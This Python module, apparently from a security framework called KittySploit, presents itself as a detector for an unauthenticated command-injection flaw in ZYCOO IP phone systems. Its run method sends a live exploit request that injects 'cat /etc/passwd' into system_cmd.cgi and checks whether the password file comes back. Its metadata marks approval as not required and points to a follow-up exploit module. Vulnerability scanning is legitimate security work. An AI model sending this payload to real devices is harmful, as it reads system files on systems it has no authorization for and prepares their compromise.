#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZYCOO IP Phone System system_cmd.cgi RCE."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZYCOO IP Phone - system_cmd.cgi RCE Detection',
        'description': (
            'Detects ZYCOO unauthenticated command injection via '
            "/cgi-bin/system_cmd.cgi?cmd='cat /etc/passwd'."
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'zycoo', 'voip', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/zycoo_system_cmd_rce'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39406/',
        ],
    }

    def run(self):
        path = "/cgi-bin/system_cmd.cgi?cmd='cat%20/etc/passwd'"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='ZYCOO system_cmd.cgi RCE',
                path='/cgi-bin/system_cmd.cgi',
            )
            return True
        return False
